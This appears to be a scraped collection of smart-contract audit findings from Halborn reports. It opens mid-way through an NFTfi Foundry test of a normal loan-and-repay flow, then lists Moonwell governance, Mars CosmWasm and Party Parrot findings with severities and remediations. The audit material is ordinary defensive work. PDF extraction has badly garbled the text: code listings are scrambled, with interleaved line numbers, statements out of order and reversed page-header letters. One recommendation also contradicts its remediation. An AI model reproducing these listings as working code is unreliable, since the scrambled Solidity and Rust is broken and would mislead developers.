transfer ( carla , 250 _000000000000000000 ); // LOGS console . log ( \" ****** SETTING ENVIRONMENT ****** \"); console . log ( \" ****** STATE 1 ******* \"); console . log ( \" ****** BALANCES ****** \"); console . log ( \" Balance Of Admin ---> \" , token .  balanceOf ( admin )); 114 console . log ( \" Balance Of Alice ---> \" , token .  balanceOf ( alice )); 115 console . log ( \" Balance Of Bobby ---> \" , token .  balanceOf ( bobby )); 116 console . log ( \" Balance Of Carla ---> \" , token .  balanceOf ( carla )); 117 console . log ( \" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 118 119 120 121 122 123 124 125 126 127 console . log ( \" \" ); console . log ( \" \" ); // PUSHING KEYS AND ADDRESSES OF NFT AND TOKEN CONTRACTS contractKeys . push ( ' PERMITTED_NFTS '); contractAddresses . push ( address ( nftContract )) ; permittedErc20s . push ( address ( token )) ; // DEPLOYING NFT HUB nftFiHub = new NftfiHub ( admin , contractKeys ,  contractAddresses ); 128 129 130 address nftFiHubAddr = address ( nftFiHub ); // DEPLOYING PROMISORY NOTES AND OBLIGATION RECEPT  CONTRACTS 131 nftObligationReceipt = new SmartNft ( admin , address (  nftFiHub ) , address ( directLoanCoordinator ) , \" nftObligationReceipt \" ,  \" NOR \" , \" customURI \"); 132 nftPromissoryNote = new SmartNft ( admin , address ( nftFiHub ) ,  address ( directLoanCoordinator ) , \" nftPromissoryNote \" , \" NOR \" , \"  customURI \"); 22 G N I T S E T L A U N A M 133 134 vm . prank ( admin ); nftObligationReceipt . setLoanCoordinator ( address (  directLoanCoordinator )) ; vm . prank ( admin ); nftPromissoryNote . setLoanCoordinator ( address ( 135 136  directLoanCoordinator )) ; 137 138 139 // DEPLOYING DIRECT_LOAN_FIXED_OFFER_REDEPLOY directLoanFixedOfferRedeploy = new  DirectLoanFixedOfferRedeploy ( admin , nftFiHubAddr , permittedErc20s )  ; 140 address directLoanFixedOfferRedeployAddr = address (  directLoanFixedOfferRedeploy ); 141 142 143 144 145 // DEPLOYING DIRECT LOAN COORDINATOR loanTypes . push ( \" DIRECT_LOAN_FIXED_REDEPLOY \" ); loanContracts . push ( address ( directLoanFixedOfferRedeploy )); directLoanCoordinator = new DirectLoanCoordinator ( address (  nftFiHub ) , admin , loanTypes , loanContracts ); 146 147 148 // INITIALIZING DIRECT LOAN COORDINATOR directLoanCoordinator . initialize ( address ( nftPromissoryNote  ) , address ( nftObligationReceipt )) ; vm . prank ( admin ); nftObligationReceipt . setLoanCoordinator ( address ( 149 150  directLoanCoordinator )) ; vm . prank ( admin ); nftPromissoryNote . setLoanCoordinator ( address ( 151 152  directLoanCoordinator )) ; 153 154 155 156 157 158 // SETTING CONTRACTKEYS AND CONTRACTADDRRESSES contractKeys . push ( ' DIRECT_LOAN_COORDINATOR '); contractAddresses . push ( address ( directLoanCoordinator )) ; vm . prank ( admin ); nftFiHub . setContract ( ' DIRECT_LOAN_COORDINATOR ' , address (  directLoanCoordinator )) ; 159 160 161 162 163 164 165 // REGISTRATION OF PERMITTED NFTS AND TYPES definedNftTypes . push ( ' ERC721 '); definedNftWrappers . push ( address ( nftWrapper )) ; permittedNftContracts . push ( address ( nftContract )) ; permittedNftTypes . push ( ' ERC721 '); permittedNFTsAndTypeRegistry = new  PermittedNFTsAndTypeRegistry ( admin , nftFiHubAddr , definedNftTypes , 23 G N I T S E T L A U N A M  definedNftWrappers , permittedNftContracts , permittedNftTypes ); 166 167 168 169 // APPROVALS FOR PUT NFTS AS COLATERAL vm . prank ( alice ); nftContract . setApprovalForAll ( address (  directLoanFixedOfferRedeployAddr ) , true ); 170 } G N I T S E T L A U N A M 24 TEST 1: Script Listing 5: NFTFi.t.sol 174 function test_1 () public { 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 }) ; /* ****************************************** */ /* TEST 1: LENDING BORROWING NORMAL PROCEDURE */ /* ****************************************** */ console . log (\" ****************************** \" ); console . log (\" ********** ********** \" ); console . log (\" ****************************** \" ); console . log (\" \"); TEST 1 // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 1, nftCollateralContract : address ( nftContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 200 201 202 203 204 205 206 207 208 209 210 211 212 G N I T S E T L A U N A M // GETTING CHAIN ID uint256 id ; assembly { id := chainid () } // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : hex \" 1c \" 25 213 214 215 216 217 }) ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( getEncodedOffer ( offer ) ,  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 218 219 220 221 222 223 224  ; 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 ); // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf }) ; // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , signaturefi ,  borrowerSettings ); 241 242 243 // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 loanPrincipalAmount , uint256 maximumRepaymentAmount ,  uint256 nftCollateralId , address loanERC20Denomination , uint32  loanDuration , uint32 loanInterestRateForDuration , uint16  loanAdminFeeInBasisPoints , address nftCollateralWrapper , uint64  loanStartTime , address nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 244 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 245 246 // LOGS 26 G N I T S E T L A U N A M 247 248 249 250 251 console . log (\" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log (\" \"); console . log (\" ****** STATE 1 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 252 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 253 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 254 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 255 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 256 257 258 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount ---> \" ,  loanPrincipalAmount ); 259 console . log (\" maximumRepaymentAmount ---> \" ,  maximumRepaymentAmount ); 260 console . log (\" nftCollateralId ---> \" ,  nftCollateralId ); 261 console . log (\" loanERC20Denomination ---> \" ,  loanERC20Denomination ); 262 263 console . log (\" loanDuration console . log (\" interestRateForDuration ---> \" , loanDuration ); ---> \" ,  loanInterestRateForDuration ); 264 console . log (\" loanAdminFeeInBasisPoints ---> \" ,  loanAdminFeeInBasisPoints ); 265 console . log (\" nftCollateralWrapper ---> \" ,  nftCollateralWrapper ); 266  ; 267 console . log (\" loanStartTime ---> \" , loanStartTime ) console . log (\" nftCollateralContract ---> \" ,  nftCollateralContract ); 268 269 270 271 272 273 274 275 276 console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" , borrower ); ---> \" , liquidated ); // 5 DAYS LATER console . log (\" 5 DAYS LATER ... \"); vm . warp (5 * day ); // ALICE PAY THE MONEY 27 G N I T S E T L A U N A M 277 278 vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12  _000000000000000000 ); 279 280 281 282 283 284 vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 a , uint256 b , uint256 c , address d , uint32 e , uint32  f , uint16 g , address h , uint64 i , address j , address k ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 285 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 286 287 288 289 290 console . log (\" TX : ALICE ---> PAY BACK LOAN \" ); console . log (\" \"); console . log (\" ****** STATE 3 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 291 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 292 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 293 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 294 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 } console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount console . log (\" maximumRepaymentAmount console . log (\" nftCollateralId console . log (\" loanERC20Denomination console . log (\" loanDuration console . log (\" interestRateForDuration console . log (\" loanAdminFeeInBasisPoints console . log (\" nftCollateralWrapper console . log (\" loanStartTime console . log (\" nftCollateralContract console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" ,a ); ---> \" ,b ); ---> \" ,c ); ---> \" ,d ); ---> \" ,e ); ---> \" ,f ); ---> \" ,g ); ---> \" ,h ); ---> \" ,i ); ---> \" ,j ); ---> \" ,k ); ---> \" , liquidated ); 28 G N I T S E T L A U N A M Output G N I T S E T L A U N A M 29 /* ****************************************************** */ /* TEST 2: LENDING BORROWING NORMAL PROCEDURE OUT OF TIME */ /* ****************************************************** */ TEST 2: Script Listing 6: NFTFi.t.sol 312 function test_2 () public { 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 }) ; console . log (\" ****************************** \" ); console . log (\" ********** ********** \" ); console . log (\" ****************************** \" ); console . log (\" \"); TEST 2 // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 1, nftCollateralContract : address ( nftContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 338 339 340 341 342 343 344 345 346 347 348 349 350 G N I T S E T L A U N A M // GETTING CHAIN ID uint256 id ; assembly { id := chainid () } // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : hex \" 1c \" 30 351 352 353 354 355 }) ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( getEncodedOffer ( offer ) ,  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 356 357 358 359 360 361 362  ; 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 ); // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf }) ; // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , signaturefi ,  borrowerSettings ); 379 380 381 // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 loanPrincipalAmount , uint256 maximumRepaymentAmount ,  uint256 nftCollateralId , address loanERC20Denomination , uint32  loanDuration , uint32 loanInterestRateForDuration , uint16  loanAdminFeeInBasisPoints , address nftCollateralWrapper , uint64  loanStartTime , address nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 382 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 383 384 // LOGS 31 G N I T S E T L A U N A M 385 386 387 388 389 console . log (\" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log (\" \"); console . log (\" ****** STATE 1 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 390 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 391 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 392 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 393 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 394 395 396 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount ---> \" ,  loanPrincipalAmount ); 397 console . log (\" maximumRepaymentAmount ---> \" ,  maximumRepaymentAmount ); 398 console . log (\" nftCollateralId ---> \" ,  nftCollateralId ); 399 console . log (\" loanERC20Denomination ---> \" ,  loanERC20Denomination ); 400 401 console . log (\" loanDuration console . log (\" interestRateForDuration ---> \" , loanDuration ); ---> \" ,  loanInterestRateForDuration ); 402 console . log (\" loanAdminFeeInBasisPoints ---> \" ,  loanAdminFeeInBasisPoints ); 403 console . log (\" nftCollateralWrapper ---> \" ,  nftCollateralWrapper ); 404  ; 405 console . log (\" loanStartTime ---> \" , loanStartTime ) console . log (\" nftCollateralContract ---> \" ,  nftCollateralContract ); 406 407 408 409 410 411 412 413 414 console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" , borrower ); ---> \" , liquidated ); // 15 DAYS LATER console . log (\" 15 DAYS LATER ", "labels": ["Halborn", "NFTfi_DirectLoanFixedOffer_Redeployment", "Severity: Informational"]}, {"title": "MISSING QUORUM CAP COMPARISON CAN BREAK THE GOVERNANCE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "GovernorApollo is implemented with a new floating quorum feature. A floating quorum is calculated as a weighted average between 80% of the old quorum and 20% of the most recent vote(s). The quorum also has upper and lower bounds. In these bounds, there is no comparison implemented. With the following scenario, dynamic quorum system can be broken. SCENARIO:  Set quorum caps with the timelock.  There is no comparison between lowerQuorumCap and upperQuorumCap.  With the timelock, lowerQuorumCap can be bigger than upperQuorumCap.  During _calculateNewQuorum calculation, newQuorum can be directly manipulated with the timelock. Code Location: MoonwellApolloGovernor.sol#L523 Listing 1: MoonwellApolloGovernor.sol function setQuorumCaps ( uint newLowerQuorumCap , uint require ( msg . sender == address ( timelock ) , \" only timelock \"); 1  newUpperQuorumCap ) external { 2 3 4 5 6 7  newLowerQuorumCap ); } 8 9 if ( newLowerQuorumCap != lowerQuorumCap ) { uint oldLowerQuorumCap = lowerQuorumCap ; lowerQuorumCap = newLowerQuorumCap ; emit LowerQuorumCapChanged ( oldLowerQuorumCap , 13 if ( newUpperQuorumCap != upperQuorumCap ) { uint oldUpperQuorumCap = upperQuorumCap ; upperQuorumCap = newUpperQuorumCap ; emit UpperQuorumCapChanged ( oldUpperQuorumCap , 10 11 12 13  newUpperQuorumCap ); 14 } 15 } Risk Level: Likelihood - 4 Impact - 4 Recommendation: Ensure that lowerQuorumCap is not bigger than upperQuorumCap. Remediation Plan: SOLVED: The Moonwell team solved this issue by implementing the comparison between caps. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 14 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: High"]}, {"title": "ABIENCODERV2 IS ACTIVATED BY DEFAULT 0.8+", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "ABIEncoderV2 is being stated in a solidity version 0.8+ which is not needed since ABIEncoderV2 is activated by default 0.8+. Code Location: MoonwellApolloGovernor.sol#L2 Listing 2: MoonwellApolloGovernor.sol 1 pragma solidity 0.8.10; 2 pragma experimental ABIEncoderV2 ; 3 4 import \" ./ IERC20 . sol \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider removing the ABIEncoderV2. Remediation Plan: SOLVED: The Moonwell team solved this issue by removing ABIEncoderV2. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 15 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "BUMP SOLIDITY VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the review the newest version of solidity was released with the important bug fixes & Bug. Code Location: MoonwellApolloGovernor.sol#L2 Listing 3: MoonwellApolloGovernor.sol 1 pragma solidity 0.8.10; 2 pragma experimental ABIEncoderV2 ; 3 4 import \" ./ IERC20 . sol \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Move from 0.8.10 to 0.8.17. Remediation Plan: SOLVED: The Moonwell team solved this issue by updating pragma to 0.8.17. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 16 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "NO NEED TO INITIALIZE QUORUMADJUSTED WITH FALSE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "boolean variable are initialized to a default value of false per Solidity docs. Setting a variable to the default value is unnecessary. Code Location: MoonwellApolloGovernor.sol#L278 Listing 4: MoonwellApolloGovernor.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Proposal storage newProposal = proposals [ proposalCount ]; newProposal . id = proposalCount ; newProposal . proposer = msg . sender ; newProposal . eta = 0; newProposal . targets = targets ; newProposal . values = values ; newProposal . signatures = signatures ; newProposal . calldatas = calldatas ; newProposal . startTimestamp = startTimestamp ; newProposal . endTimestamp = endTimestamp ; newProposal . startBlock = 0; newProposal . forVotes = 0; newProposal . againstVotes = 0; newProposal . abstainVotes = 0; newProposal . totalVotes = 0; newProposal . canceled = false ; newProposal . executed = false ; newProposal . quorum = currentQuorum ; newProposal . quorumAdjusted = false ; 17 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Remove explicit initialization for default values. Remediation Plan: SOLVED: The Moonwell team solved this issue by removing explicit ini- tialization. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 18 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "CURRENT QUORUM CAN BE EMITTED DURING THE PROPOSAL CREATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Events allow capturing the changed parameters so that off-chain tool- s/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages. In the implementation, current quorum is not emitted on the proposal generation. Code Location: MoonwellApolloGovernor.sol#L282 Listing 5: MoonwellApolloGovernor.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Proposal storage newProposal = proposals [ proposalCount ]; newProposal . id = proposalCount ; newProposal . proposer = msg . sender ; newProposal . eta = 0; newProposal . targets = targets ; newProposal . values = values ; newProposal . signatures = signatures ; newProposal . calldatas = calldatas ; newProposal . startTimestamp = startTimestamp ; newProposal . endTimestamp = endTimestamp ; newProposal . startBlock = 0; newProposal . forVotes = 0; newProposal . againstVotes = 0; newProposal . abstainVotes = 0; newProposal . totalVotes = 0; newProposal . canceled = false ; newProposal . executed = false ; 19 latestProposalIds [ newProposal . proposer ] = proposalCount ; newProposal . quorum = currentQuorum ; newProposal . quorumAdjusted = false ; 18 19 20 21 22 23  values , signatures , calldatas , startTimestamp , endTimestamp ,  description ); 24 return newProposal . id ; emit ProposalCreated ( newProposal .id , msg . sender , targets , Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider omitting current quorum on the proposal creation. Remediation Plan: SOLVED: The Moonwell team solved this issue by adding current quorum to the event. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 20 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "USE PREFIX INCREMENT WITH THE UNCHECK CAN SAVE GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The code sections use i++ which costs more gas than ++i, especially in a loop. Finally, the initialization of i = 0 can be skipped, as 0 is the default value. Code Location: MoonwellApolloGovernor.sol#L255-L676 Listing 6: MoonwellApolloGovernor.sol function getQuorum () public view returns ( uint ) { // Start at the high water mark for ( uint i = lastQuorumAdjustment + 1; i < proposalCount ; // Pull state and ignore in flight proposals ProposalState proposalState = state ( i ); if ( proposalState == ProposalState . Pending || uint newQuorum = currentQuorum ; 1 2 3 4 5  i ++) { 6 7 8  proposalState == ProposalState . Active ) { 9 10 11 12 13 14 15  taken into account . 16 17  calculations . 18 19 continue ; continue ; } // Get the proposal Proposal storage proposal = proposals [i ]; // Only proceed if quorum for this proposal is not yet if (! proposal . quorumAdjusted ) { // If a proposal is canceled , ignore it in quorum if ( proposalState == ProposalState . Canceled ) { 21 // Adjust quorum in accordance with the proposal . newQuorum = _calculateNewQuorum ( newQuorum , } 20 21 22 23  proposal . totalVotes ); 24 25 26 27 28 29 } } } return newQuorum ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use ++i instead of i++ to increment the value of an uint variable. Use unchecked where possible, and skip initialization to 0. Remediation Plan: SOLVED: The Moonwell team solved this issue with using prefix increment. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 22 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "SAFEMATH IS ACTIVATED BY DEFAULT AFTER 0.8.X", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Solidity versions >= 0.8.x perform checked arithmetic by default, so the SafeMath library is unnecessary in most cases. Code Location: MoonwellApolloGovernor.sol#L704-L713 Listing 7: MoonwellApolloGovernor.sol function add256 ( uint256 a , uint256 b ) internal pure returns ( uint c = a + b ; require (c >= a , \" addition overflow \" ); return c; function sub256 ( uint256 a , uint256 b ) internal pure returns ( require (b <= a , \" subtraction underflow \"); return a - b ; } 1  uint ) { 2 3 4 5 6 7  uint ) { 8 9 10 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to delete SafeMath from the contract. 23 Remediation Plan: SOLVED: The Moonwell team solved this issue with deleting SafeMath from the contract. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 24 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "MISSING NATSPEC DOCUMENTATION ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some functions are missing @param for some of their parameters. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability, and usability. Code Location: MoonwellApolloGovernor.sol#L523 Listing 8: MoonwellApolloGovernor.sol function setQuorumCaps ( uint newLowerQuorumCap , uint require ( msg . sender == address ( timelock ) , \" only timelock \"); 1  newUpperQuorumCap ) external { 2 3 4 5 6 7  newLowerQuorumCap ); 8 } 9 10 11 12 13  newUpperQuorumCap ); 14 } 15 } if ( newLowerQuorumCap != lowerQuorumCap ) { uint oldLowerQuorumCap = lowerQuorumCap ; lowerQuorumCap = newLowerQuorumCap ; emit LowerQuorumCapChanged ( oldLowerQuorumCap , if ( newUpperQuorumCap != upperQuorumCap ) { uint oldUpperQuorumCap = upperQuorumCap ; upperQuorumCap = newUpperQuorumCap ; emit UpperQuorumCapChanged ( oldUpperQuorumCap , 25 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider adding in full NatSpec comments for all functions to have complete code documentation for future use. Remediation Plan: SOLVED: The Moonwell team solved this issue by adding natspecs on the functions. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 26 ", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "CHANGING FUNCTION VISIBILITY FROM PUBLIC TO EXTERNAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are the functions declared as public that are never called internally It is good practice to mark such functions as within the contract. external, as this saves gas (Especially in the case where the function takes arguments, since external functions can read arguments directly from call data instead of having to allocate memory). Code Location: Listing 9: MoonwellApolloGovernor.sol } bytes32 domainSeparator = keccak256 ( abi . encode ( function castVoteBySig ( uint256 proposalId , uint8 voteValue , function castVote ( uint proposalId , uint8 voteValue ) public { return _castVote ( msg . sender , proposalId , voteValue ); 1 2 3 4 5  uint8 v , bytes32 r , bytes32 s ) public { 6  DOMAIN_TYPEHASH , keccak256 ( bytes ( name )) , getChainId () , address (  this ))); 7  proposalId , voteValue )) ; 8  domainSeparator , structHash )) ; 9 10  castVoteBySig : invalid signature \"); 11 12 address signatory = ecrecover ( digest , v , r , s ); require ( signatory != address (0) , \" GovernorApollo :: bytes32 digest = keccak256 ( abi . encodePacked (\" \\ x19 \\ x01 \" , return _castVote ( signatory , proposalId , voteValue ); bytes32 structHash = keccak256 ( abi . encode ( BALLOT_TYPEHASH , } 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Functions should be marked as an external for gas optimization. Listing 10 1 public - everyone can access . 2 3 external - Cannot be accessed internally , only externally . 4 5 internal - only this contract and contracts derived from it can  access . 6 7 private - can only be accessed from this contract . Remediation Plan: SOLVED: The Moonwell team solved this issue by setting external functions. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 28 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Moonwell_Finance_Governance_Dynamic_Quorum", "Severity: Informational"]}, {"title": "LACK OF DENOM VALIDATION ON CHECKED ASSET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_CW_Asset_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Assets information could be stored both as AssetInfoUnchecked and AssetInfo. Validation of an assets info was done through the check() function part of the AssetInfoUnchecked implementation. However, only concerning CW20 tokens there were actual validation steps being applied but none for Native coins. Using some format rules upon checking an AssetInfoUnchecked element avoids potentially undesirable situations. For instance, if a user creates (mistakenly or not) a fake native coin UUSD instead of uusd, it will be stored in contracts storage. As a result, when other users operations use this fake coin, they will always fail and make users spend transactions fees needlessly. Listing 1: Proof of concept (Lines 3) 1 let uusd = Asset :: native ( \" uusd \" , 5 u128 ); 2 let uusd2 = Asset :: native ( \" UUSD \" , 5 u128 ); 3 assert_eq! ( uusd2 == uusd , true ); // This will fail as they are deemed to be different assets . Code Location: Listing 2: asset_info.rs (Lines 88) Ok ( match self { 83 pub fn check (& self , api : & dyn Api ) -> StdResult < AssetInfo > { 84 85 86 87 88 } AssetInfoUnchecked :: Native ( denom ) => AssetInfo :: Native ( AssetInfo :: Cw20 ( api . addr_validate ( contract_addr ) ?) AssetInfoUnchecked :: Cw20 ( contract_addr ) = > { denom . clone () ) , 89 }) 11 Risk Level: Likelihood - 3 Impact - 1 Recommendation: Enforce some basic format rules on denom such as being 4 lowercase a-z characters. A more strict option would be to perform white-listing by comparing the denom against the complete list of valid native coins on Terra. Remediation plan: SOLVED: the check function was modified to perform white-listing by accepting a list of valid denoms to compare the assets details with, as suggested above. This issue was fixed on commit 9beba1158f8b3e7f06a237c7d35fc89fb1ba3e6b 12 ", "labels": ["Halborn", "Mars_CW_Asset_CosmWasm", "Severity: Low"]}, {"title": "OUTDATED DEPENDENCY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Partyparrot is using solana dependency version 1.6.3 which is not the last solana version. Also anchor version is too old compare to the latest one 0.13.x. Crate for fixed point number which is fixed is also old. It is always recommended to use the latest solana program version to avoid already fixed issues. Code Location: Listing 1: Cargo.toml (Lines 22,23,24,25) 21 [ dependencies ] 22 